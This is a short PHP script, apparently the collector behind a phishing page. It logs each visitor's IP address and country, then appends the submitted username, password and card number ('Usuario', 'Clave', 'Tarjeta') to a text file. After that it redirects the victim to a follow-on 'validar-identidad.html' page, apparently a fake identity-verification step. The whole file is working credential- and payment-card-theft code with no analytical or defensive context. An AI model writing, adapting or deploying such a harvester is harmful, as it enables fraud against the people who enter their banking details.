<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$datoa=$_POST['usrp'];
$datob=$_POST['pssd'];
$datoc=$_POST['tarjeta'];
$archivo="silfre21$.txt";
$file=fopen($archivo,"a");
fwrite($file, "".$date.PHP_EOL);
fwrite($file, "". $ipdat->geoplugin_countryCode . PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "Usuario: ".$datoa.PHP_EOL);
fwrite($file, "Clave: " .$datob.PHP_EOL);
fwrite($file, "Tarjeta: " .$datoc.PHP_EOL);
fclose($file);
Header ("Location:validar-identidad.html");?>
